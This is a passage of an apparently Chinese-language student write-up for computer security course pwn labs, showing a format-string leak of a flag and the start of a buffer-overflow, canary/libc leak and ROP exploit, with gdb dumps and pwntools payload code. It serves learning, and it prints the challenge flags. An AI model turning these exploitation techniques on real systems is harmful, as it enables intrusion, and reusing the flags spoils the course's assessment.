åŸ·è¡Œçš„æ™‚å€™å¦‚æœé‡åˆ°localç«¯å¯ä»¥runä½†serverçˆ›æ‰çš„æƒ…æ³ï¼Œæœ‰å¯èƒ½æ˜¯raw_input()é€ æˆçš„ï¼Œå¯ä»¥å…ˆè¨»è§£æ‰é€™äº›æ±è¥¿ï¼Œå¦‚æœé‚„æ˜¯é‡åˆ°ä¸€æ¨£çš„å•é¡Œï¼Œå¯ä»¥é–‹dockeråœ¨è£¡é¢åŸ·è¡Œ</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ docker-compose up -d
</span></span><span style=display:flex><span>$ docker ps
</span></span><span style=display:flex><span>$ docker exec -it <span style=color:#f92672>{</span>container name<span style=color:#f92672>}</span> /bin/bash
</span></span><span style=display:flex><span>&gt; apt update; apt upgrade -y; apt install curl binutils vim git gdb python3 python3-pip -y
</span></span><span style=display:flex><span>&gt; pip install pwntools -y
</span></span><span style=display:flex><span>&gt; python3 exp.py</span></span></code></pre></div><p>:::</p><h2 id=lab-fmt>Lab-FMT</h2><p>Flag: <code>flag{www.youtube.com/watch?v=Ci_zad39Uhw}</code></p><h3 id=è§£é¡Œæµç¨‹èˆ‡æ€è·¯-10>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</h3><p>é€™ä¸€é¡Œå’Œä¹‹å‰å¯«éçš„FMTé¡Œç›®å¤§åŒå°ç•°ï¼Œä¸éæœ‰åŠ å…¥%sçš„è§€å¿µåœ¨è£¡é¢ï¼Œå¯ä»¥å…ˆåƒè€ƒ<a href=https://hackmd.io/@SBK6401/ByE7M6djn rel=external target=_blank>PicoCTF - flag leak</a></p><ol><li>é¦–å…ˆé¡Œç›®æœƒè®€å–<code>/home/chal/flag.txt</code>ä¸¦å¯«å…¥åˆ°global variable - flagä¸­ï¼Œæ‰€ä»¥ç›®æ¨™å¾ˆæ˜ç¢ºï¼Œå°±æ˜¯è¦åˆ©ç”¨å…©æ¬¡çš„printfçš„format string bugè®€å–åˆ°flagï¼Œè€Œç‚ºç”šéº¼è¦å…©æ¬¡å‘¢?ç¬¬ä¸€æ¬¡å°±æ˜¯è¦leakå‡ºbss sectionçš„base addressï¼Œæˆ–æ˜¯å¯ä»¥èªªtext sectionçš„base addressï¼Œç¬¬äºŒæ¬¡å°±æ˜¯åˆ©ç”¨è©²çµæœå¯¦éš›leakå‡ºflagçš„å…§å®¹</li><li>Leak Global Variableçš„base address
é¦–å…ˆç›´æ¥ç”¨gdbè·Ÿä¸€ä¸‹è·‘åˆ°è¼¸å…¥çš„æ™‚å€™stackä¸Šçš„æ®˜ç•™å€¼<div class="highlight wrap-code" dir=auto><pre tabindex=0><code>0x00007fffffffd640â”‚+0x0000: 0x00000000000c0000   â† $rsp
0x00007fffffffd648â”‚+0x0008: 0xffffffff00000008
0x00007fffffffd650â”‚+0x0010: &#34;aaaabbbb\n&#34;         â† $rsi
0x00007fffffffd658â”‚+0x0018: 0x000000000000000a (&#34;\n&#34;?)
0x00007fffffffd660â”‚+0x0020: 0x0000000000000040 (&#34;@&#34;?)
0x00007fffffffd668â”‚+0x0028: 0x0000000000000010
0x00007fffffffd670â”‚+0x0030: 0x0000000000000000
0x00007fffffffd678â”‚+0x0038: 0x0000000100000000
0x00007fffffffd680â”‚+0x0040: 0x0000000000000002
0x00007fffffffd688â”‚+0x0048: 0x8000000000000006
0x00007fffffffd690â”‚+0x0050: 0x0000000000000000
0x00007fffffffd698â”‚+0x0058: 0x0000000000000000
0x00007fffffffd6a0â”‚+0x0060: 0x0000000000000000
0x00007fffffffd6a8â”‚+0x0068: 0x0000000000000000
0x00007fffffffd6b0â”‚+0x0070: 0x0000000000000000
0x00007fffffffd6b8â”‚+0x0078: 0x0000000000000000
0x00007fffffffd6c0â”‚+0x0080: 0x0000000000000000
0x00007fffffffd6c8â”‚+0x0088: 0x0000000000000000
0x00007fffffffd6d0â”‚+0x0090: 0x0000000000000000
0x00007fffffffd6d8â”‚+0x0098: 0x00007ffff7fe48e0  â†’  &lt;dl_main+0&gt; endbr64
0x00007fffffffd6e0â”‚+0x00a0: 0x000000000000000d (&#34;\r&#34;?)
0x00007fffffffd6e8â”‚+0x00a8: 0x0000000000000001
0x00007fffffffd6f0â”‚+0x00b0: 0x0000000000000001
0x00007fffffffd6f8â”‚+0x00b8: 0x0000000000000001
0x00007fffffffd700â”‚+0x00c0: 0x0000555555554040  â†’   (bad)
0x00007fffffffd708â”‚+0x00c8: 0x00007ffff7fe283c  â†’  &lt;_dl_sysdep_start+1020&gt; mov rax, QWORD PTR [rsp+0x58]
0x00007fffffffd710â”‚+0x00d0: 0x00000000000006f0
0x00007fffffffd718â”‚+0x00d8: 0x00007fffffffdbc9  â†’  0xb6a8e220a241e577
0x00007fffffffd720â”‚+0x00e0: 0x00007ffff7fc1000  â†’  0x00010102464c457f
0x00007fffffffd728â”‚+0x00e8: 0x0000010101000000
0x00007fffffffd730â”‚+0x00f0: 0x0000000000000002
0x00007fffffffd738â”‚+0x00f8: 0x000000001f8bfbff
0x00007fffffffd740â”‚+0x0100: 0x00007fffffffdbd9  â†’  0x000034365f363878 (&#34;x86_64&#34;?)
0x00007fffffffd748â”‚+0x0108: 0x0000000000000064 (&#34;d&#34;?)
0x00007fffffffd750â”‚+0x0110: 0x0000000000001000
0x00007fffffffd758â”‚+0x0118: 0xb6a8e220a241e500
0x00007fffffffd760â”‚+0x0120: 0x0000000000000001   â† $rbp
0x00007fffffffd768â”‚+0x0128: 0x00007ffff7db7d90  â†’  &lt;__libc_start_call_main+128&gt; mov edi, eax
0x00007fffffffd770â”‚+0x0130: 0x0000000000000000
0x00007fffffffd778â”‚+0x0138: 0x00005555555551e9  â†’  &lt;main+0&gt; endbr64</code></pre></div>å¯ä»¥çœ‹åˆ°æœ€å¾Œä¸€å€‹æ•¸å€¼å°±æ˜¯textæ®µçš„æ®˜ç•™å€¼ï¼Œè€Œä¸”è·é›¢è¼¸å…¥çš„åœ°æ–¹æœ‰ä¸€é»è·é›¢(0x138)æ‰€ä»¥æ‡‰è©²ä¸æœƒè¢«è“‹åˆ°ã€‚
æ¥è‘—æŸ¥çœ‹vmmapçš„åˆ†å¸ƒå°±å¯ä»¥çŸ¥é“ä»–çš„offsetç‚ºå¤šå°‘<div class="highlight wrap-code" dir=auto><pre tabindex=0><code>[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_fmt_leak/share/chal
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_fmt_leak/share/chal
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_fmt_leak/share/chal
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_fmt_leak/share/chal</code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gefâ¤  p/x 0x00005555555551e9-0x0000555555554000
</span></span><span style=display:flex><span>$8 <span style=color:#f92672>=</span> 0x11e9
</span></span><span style=display:flex><span>gefâ¤  p &amp;flag
</span></span><span style=display:flex><span>$9 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>&lt;data variable, no debug info&gt; *<span style=color:#f92672>)</span> 0x555555558040 &lt;flag&gt;
</span></span><span style=display:flex><span>gefâ¤  p/x 0x555555558040-0x0000555555554000
</span></span><span style=display:flex><span>$10 <span style=color:#f92672>=</span> 0x4040</span></span></code></pre></div>å¾ä»¥ä¸Šçµæœå¾—çŸ¥ï¼Œleakå‡ºä¾†çš„ä½å€ï¼Œä»–è·é›¢base addressçš„offsetæ˜¯0x11e9ï¼Œè€Œflagçš„ä½ç½®åœ¨<code>0x555555558040</code>ï¼Œä»–çš„offsetå°±æ˜¯0x4040</li><li>Construct Payload
ç¶“éæ›ç®—$(0x00007fffffffd778 - 0x00007fffffffd640) / 8 + 6 = 45$ï¼Œé€™æ¨£æˆ‘å€‘å°±å¯ä»¥æŠŠè©²ä½ç½®çš„value leakå‡ºä¾†<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%p.&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>39</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>6</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span></span></span></code></pre></div></li><li>Calculate Flag Address<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>text_offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x11e9</span>
</span></span><span style=display:flex><span>flag_offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4040</span>
</span></span><span style=display:flex><span>text_addr <span style=color:#f92672>=</span> int(r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;.&#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>2</span>], <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>text_base <span style=color:#f92672>=</span> text_addr <span style=color:#f92672>-</span> text_offset
</span></span><span style=display:flex><span>flag_addr <span style=color:#f92672>=</span> text_base <span style=color:#f92672>+</span> flag_offset</span></span></code></pre></div></li><li>Write Flag Address to Stack
åšé€™ä¸€æ­¥çš„æ„æ€æ˜¯å› ç‚ºflagæœ¬èº«ä¸åœ¨stackä¸Šï¼Œä»–æ˜¯åœ¨å…¶ä»–sectionä¸Šï¼Œæ‰€ä»¥æˆ‘å€‘åªèƒ½ç”¨<code>%s</code>è®“ä»–è®€flag addressæŒ‡å‘çš„valueï¼Œä½†é¦–å…ˆæˆ‘å€‘è¦åˆ©ç”¨BOFçš„æ¼æ´å¯«ä¸Šflag addressï¼Œå†åˆ©ç”¨FMTè®€å‡ºä¾†ï¼Œé€™å€‹åœ°æ–¹å’Œä¸Šèª²æ™‚åŠ©æ•™å¯«çš„ä¸å¤ªä¸€æ¨£ï¼Œå…¶å¯¦ä¸éœ€è¦é€™éº¼çš„éº»ç…©ï¼Œåˆ©ç”¨<code>k$</code>å°±å¯ä»¥æŒ‡å®šè¦è®€å–å“ªä¸€å€‹stack valueï¼Œæ‰€ä»¥ä»¥ä¸‹çš„payloadä¸­å‡ºç¾çš„18, 0x50æ˜¯æœ‰é€£å‹•é—œä¿‚çš„ï¼Œä¸”å¯ä»¥è‡ªå®šç¾©ï¼Œä½†ä¸å»ºè­°å¯«çš„å¤ªè¿‘(è·é›¢æˆ‘å€‘è¼¸å…¥çš„stack address)ï¼Œå› ç‚ºæœ‰å¯èƒ½æœ€å¾Œè¢«ä¸æ˜åŸå› è€Œè“‹æ‰<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%18$s&#39;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> payload<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x50</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(flag_addr)</span></span></code></pre></div>å¯¦éš›å¯«ä¸Šstackå¾Œæœƒè®Šæˆ<div class="highlight wrap-code" dir=auto><pre tabindex=0><code>0x00007fff99758830â”‚+0x0000: 0x00000000000c0000   â† $rsp
0x00007fff99758838â”‚+0x0008: 0xffffffff00000008
0x00007fff99758840â”‚+0x0010: 0x0000007324383125 (&#34;%18$s&#34;?)        â† $rsi
0x00007fff99758848â”‚+0x0018: 0x0000000000000000
0x00007fff99758850â”‚+0x0020: 0x0000000000000000
0x00007fff99758858â”‚+0x0028: 0x0000000000000000
0x00007fff99758860â”‚+0x0030: 0x0000000000000000
0x00007fff99758868â”‚+0x0038: 0x0000000000000000
0x00007fff99758870â”‚+0x0040: 0x0000000000000000
0x00007fff99758878â”‚+0x0048: 0x0000000000000000
0x00007fff99758880â”‚+0x0050: 0x0000000000000000
0x00007fff99758888â”‚+0x0058: 0x0000000000000000
0x00007fff99758890â”‚+0x0060: 0x000055e273743040  â†’  &lt;flag+0&gt; add BYTE PTR [rax], al</code></pre></div>å¯ä»¥ç¨å¾®æ‰‹å‹•ç®—ä¸€ä¸‹ï¼Œ<code>0x00007fff99758890â”‚+0x0060</code>ä»¥fmtçš„è§’åº¦ä¾†èªªå°±æ˜¯5+13=18ï¼Œä»£è¡¨ä»–æ˜¯ç¬¬18å€‹ï¼Œæ­¤æ™‚æˆ‘å€‘å°±æ‹¿åˆ°flagäº†
:::spoiler TAçš„payload version<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%p&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x17</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;.&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> payload<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x80</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(flag_addr)</span></span></code></pre></div>:::</li></ol><h2 id=hw-hachama>HW-HACHAMA</h2><p>Flag: <code>flag{https://www.youtube.com/watch?v=qbEdlmzQftE&amp;list=PLQoA24ikdy_lqxvb6f70g1xTmj2u-G3NT&amp;index=1}</code></p><h3 id=è§£é¡Œæµç¨‹èˆ‡æ€è·¯-11>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</h3><p>:::warning
åˆ‡è¨˜é¡Œç›®ç”¨readæ¥ï¼Œæ‰€ä»¥ä¸éœ€è¦null byteåšçµå°¾ï¼Œå¦å¤–é¡Œç›®ä½¿ç”¨çš„libcæ˜¯ubuntu 22.04.2çš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥å¯ä»¥ç”¨dockeræŠŠlibcè³‡æ–™æ’ˆå‡ºä¾†ï¼Œå†é‡å°é€™å€‹åšæ‡‰ç”¨
:::
é€™ä¸€é¡Œæˆ‘è¦ºå¾—å‡ºçš„å¾ˆå¥½ï¼Œæœ‰å¾ˆç‰¹åˆ¥çš„exploitï¼Œä¹Ÿéœ€è¦ç”¨åˆ°å¾ˆå¤šå‰å…©å‘¨å­¸æœƒçš„å¹¾ä¹æ‰€æœ‰æŠ€èƒ½ï¼ŒåŒ…å«BOF / return 2 libc / stack pivot / ROPç­‰ç­‰</p><ol><li><p>==<strong>æ¼æ´åœ¨å“ªè£¡???</strong>==
é¦–å…ˆï¼Œä¹çœ‹ä¹‹ä¸‹æœƒä¸çŸ¥é“é€™å€‹æ´åœ¨å“ªè£¡ï¼Œä¸éå¤štryå¹¾æ¬¡æˆ–æ˜¯è·Ÿä¸€ä¸‹å‹•æ…‹æœƒç™¼ç¾ï¼Œä»–åšçš„äº‹æƒ…æœƒè“‹åˆ°åŸæœ¬==n2==çš„æ•¸å€¼ï¼Œå°è‡´æˆ‘å€‘ä¹‹å¾Œå¯ä»¥è¼¸å…¥æ›´å¤šçš„æ±è¥¿
è©³ç´°ä¾†èªªå°±æ˜¯:
å› ç‚ºåœ¨#61çš„åœ°æ–¹è¼¸å…¥çš„æ±è¥¿è¢«å­˜åˆ°local variable nameï¼Œè€Œåœ¨#63æœƒè¢«copyåˆ°global variable ==msg==ï¼Œä¸¦ä¸”å’Œ<code> hachamachama</code>åˆä½µåœ¨ä¸€èµ·ï¼Œå¦‚æœä¸€é–‹å§‹æˆ‘å€‘è¼¸å…¥çš„æ±è¥¿æ˜¯20å€‹å­—å…ƒï¼Œè€Œconcatenateçš„<code> hachamachama</code>ç¸½å…±13å€‹å­—å…ƒï¼ŒåŠ èµ·ä¾†å°±å·²ç¶“æ˜¯==33==å€‹å­—å…ƒï¼Œä½†å¦‚ä¸‹åœ–æ‰€ç¤ºï¼Œmsgä¸€é–‹å§‹çš„å¤§å°å°±è¢«é™åˆ¶åœ¨32 bytesï¼Œä¹Ÿå°±æ˜¯èªªä»–æœƒè“‹åˆ°å¾Œé¢n2çš„å€¼
<a href=#R-image-1a0f1fe52b73620d10882939faf3c2c2 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HyUsSOTBT.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-1a0f1fe52b73620d10882939faf3c2c2><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HyUsSOTBT.png></a>
å¾ä¸‹åœ–å¯ä»¥çœ‹å‡ºä¾†ï¼Œå› ç‚ºé•·åº¦è¶…éçš„é—œä¿‚ï¼ŒåŸæœ¬<code>hachamachama</code>çš„æœ€å¾Œä¸€å€‹å­—å…ƒï¼Œä¹Ÿå°±æ˜¯0x61å¾€å¾Œè“‹åˆ°n2çš„å€¼ï¼Œé€™ä»£è¡¨æˆ‘å€‘åœ¨å¾€å¾Œçš„åœ°æ–¹å¯ä»¥å¤šåŠ åˆ©ç”¨
<a href=#R-image-ee4fcbb16b1d77b0df572037a95c749f class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/SJUTP_aBT.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-ee4fcbb16b1d77b0df572037a95c749f><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/SJUTP_aBT.png></a></p></li><li><p>çŸ¥é“æ¼æ´åœ¨å“ªè£¡ä¹‹å¾Œï¼Œæˆ‘å€‘å°±å¯ä»¥åˆ©ç”¨é€™å€‹æ´ï¼ŒæŠŠstackçš„æ±è¥¿leakå‡ºä¾†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;HACHAMA&#39;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>send(payload)
</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>0x61</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;[-------------Stack Info-------------]&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>12</span>):
</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(hex(u64(result[i <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>:i <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>])))
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;[-------------Stack Info-------------]&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>canary <span style=color:#f92672>=</span> u64(result[<span style=color:#ae81ff>7</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>:<span style=color:#ae81ff>7</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>])
</span></span><span style=display:flex><span>libc_start_main <span style=color:#f92672>=</span> u64(result[<span style=color:#ae81ff>9</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>:<span style=color:#ae81ff>9</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>]) <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x80</span>
</span></span><span style=display:flex><span>libc_base_addr <span style=color:#f92672>=</span> libc_start_main <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x29d90</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x80</span>
</span></span><span style=display:flex><span>main_fn_addr <span style=color:#f92672>=</span> u64(result[<span style=color:#ae81ff>11</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>:<span style=color:#ae81ff>11</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>])
</span></span><span style=display:flex><span>code_segment_base <span style=color:#f92672>=</span> main_fn_addr <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x331</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Canary = </span><span style=color:#e6db74>{</span>hex(canary)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;libc start main base = </span><span style=color:#e6db74>{</span>hex(libc_start_main)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;libc base addr = </span><span style=color:#e6db74>{</span>hex(libc_base_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Main Function Address = </span><span style=color:#e6db74>{</span>hex(main_fn_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Code Segment = </span><span style=color:#e6db74>{</span>hex(code_segment_base)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)</span></span></code></pre></div></li><li><p>æœ‰äº†canary / libc base å’Œcode segment base / main function addressï¼Œå°±å¯ä»¥ä¾†æäº‹äº†ï¼Œåˆæ­¥çš„æƒ³æ³•æ˜¯ç›´æ¥å¯«ä¸€å€‹open / read / writeçš„syscall(å› ç‚ºseccompçš„é—œä¿‚å°è‡´æˆ‘å€‘çš„æ“ä½œæ¥µå…¶æœ‰é™)ï¼Œä¸éå› ç‚ºæˆ‘å€‘ä¹Ÿåªæ˜¯å¤šäº†0x31çš„ç©ºé–“å¯ä»¥å¯«ROPï¼Œä»£è¡¨ä¸€å®šæ²’è¾¦æ³•æŠŠæ‰€æœ‰çš„shellcodeéƒ½å¯«ä¸Šå»ï¼Œé€™æ™‚å€™å°±éœ€è¦ç”¨åˆ°stack pivotçš„æŠ€è¡“ï¼Œé–‹ä¸€å€‹ç›¸å°å¤§çš„ç©ºé–“ç¹¼çºŒæˆ‘å€‘çš„ä½œæ¥­ï¼Œä½†å°±åƒ@cccccèªªçš„</p><blockquote><p>stack pivotåªæ˜¯æŠŠä½ çš„stackç”¨åˆ°å…¶ä»–åœ°æ–¹è€Œå·²ï¼Œä¸¦ä¸æœƒå› ç‚ºä½ æ›äº†stackçš„ä½ç½®ä½ å°±èƒ½overflowæ¯”è¼ƒå¤š</p></blockquote><p>æ‰€ä»¥æ¯”è¼ƒæ­£ç¢ºçš„è§€å¿µæ˜¯ï¼Œæˆ‘å…ˆåˆ©ç”¨å¤šå‡ºä¾†çš„0x31æŠŠå¯ä»¥ç”¨çš„ç©ºé–“é–‹å¤§ï¼Œå†å¯«gadgetï¼Œæœƒæ¯”è¼ƒæ–¹ä¾¿ï¼Œå¦‚æœæ˜¯åƒlabé‚£æ¨£æ¯ä¸€å€‹æ­¥é©Ÿéƒ½åˆ‡æˆä¸€å€‹stack pivotçš„è©±ä¹Ÿä¸ç¾å¯¦ï¼Œå› ç‚ºä¸€å€‹æ“ä½œæ‰€éœ€è¦çš„ç©ºé–“ä¸€å®šå¤§æ–¼0x31ï¼Œéš¨ä¾¿èˆ‰å€‹ä¾‹å­ï¼Œå¦‚æœæ˜¯openâ†’<code>fd = open("/home/chal/flag.txt", 0);</code>ï¼Œå…¨éƒ¨çš„payloadå¦‚ä¸‹:</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/home/chal/flag.txt&#39;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x38</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> flat(
</span></span><span style=display:flex><span>    canary,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>2</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret, bss_addr_flag <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x40</span>,
</span></span><span style=display:flex><span>    pop_rdx_rbx_ret, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    pop_rsi_ret, <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    syscall_ret
</span></span><span style=display:flex><span>)</span></span></code></pre></div><p>æœ€å°‘ä¹Ÿéœ€è¦0x98çš„ç©ºé–“ï¼Œæ‰€ä»¥æ“´å¤§å¯ä»¥å¯«çš„ç©ºé–“æ˜¯å¿…è¦çš„ï¼Œä½†æˆ‘é‚„æ˜¯ç¨å¾®å˜®å¨ä¸€ä¸‹ï¼Œä¸€é–‹å§‹æˆ‘çš„æƒ³æ³•æ˜¯ç›´æ¥æŠŠn2çš„æ•¸å€¼æ”¹æ‰ï¼Œé€™æ¨£å°±å¯ä»¥è§£æ±ºä¸Šè¿°çš„å•é¡Œï¼Œä½†å¯¦éš›æ“ä½œæœƒç™¼ç¾é€™ä¹Ÿä¸ç¾å¯¦ï¼Œå› ç‚ºpayloadä¹Ÿæœƒéé•·ï¼Œå¦‚ä¸‹</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x38</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> flat(
</span></span><span style=display:flex><span>    canary,
</span></span><span style=display:flex><span>    rbp,
</span></span><span style=display:flex><span>    pop_rdi_ret, n2_addr,
</span></span><span style=display:flex><span>    pop_rdx_ret, <span style=color:#ae81ff>0x200</span>,
</span></span><span style=display:flex><span>    mov_qword_ptr_rdi_rdx_ret,
</span></span><span style=display:flex><span>    main_fn_addr <span style=color:#f92672>+</span> <span style=color:#ae81ff>291</span>,
</span></span><span style=display:flex><span>)</span></span></code></pre></div><p>é€™æ¨£æœ€å°‘ä¹Ÿéœ€è¦0x78çš„ç©ºé–“ï¼Œæ¯”èµ·æœ€å¤§å€¼çš„0x61é‚„å·®è »å¤šçš„ï¼Œæ‰€ä»¥æ˜¨å¤©å°±æƒ³äº†è¶…ä¹…æ€éº¼è§£æ±ºé€™å€‹å•é¡Œ</p></li><li><p>è§£æ±ºç©ºé–“å¤§å°çš„å•é¡Œ
